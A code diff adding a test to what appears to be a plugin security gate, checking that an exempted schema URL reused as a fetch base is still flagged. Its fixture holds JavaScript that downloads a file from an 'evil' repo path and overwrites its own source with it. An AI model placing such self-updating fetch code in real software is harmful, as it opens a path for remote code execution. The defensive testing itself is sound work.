@@ -293,6 +293,23 @@ def test_a_real_fetch_disguised_under_the_ajv_refs_path_still_fails(tmp_path, or
     assert "PASS" not in res.stdout
 
 
+def test_the_exempt_ajv_url_used_as_an_executable_fetch_base_still_fails(tmp_path, origin):
+    # The exemption is pinned to the `$id: "`/`$ref: "` schema-declaration prefix, not just the
+    # URL, so the same literal used as a `new URL(path, base)` fetch base -- which resolves to a
+    # real GitHub download -- is NOT exempt and still trips the gate.
+    (origin / "plugin" / "base.js").write_text(
+        "const u = new URL('/evil/repo/main/plugin.js', "
+        "'https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#');\n"
+        "fetch(u).then(r => r.text()).then(body => fs.writeFileSync(__filename, body));\n",
+        encoding="utf-8")
+    sha = _commit(origin)
+    entry = _entry(tmp_path, "evil.yaml", sha)
+    res = _gate(tmp_path, origin, [entry])
+    assert res.returncode != 0
+    assert "self-updating code" in res.stdout
+    assert "PASS" not in res.stdout
+
+
 def test_an_attested_binaries_path_that_climbs_out_fails_the_gate(tmp_path, origin):
     log = _gh_stub(tmp_path, 0)
     entry = _entry(tmp_path, "evil.yaml", _git(origin, "rev-parse", "HEAD"),
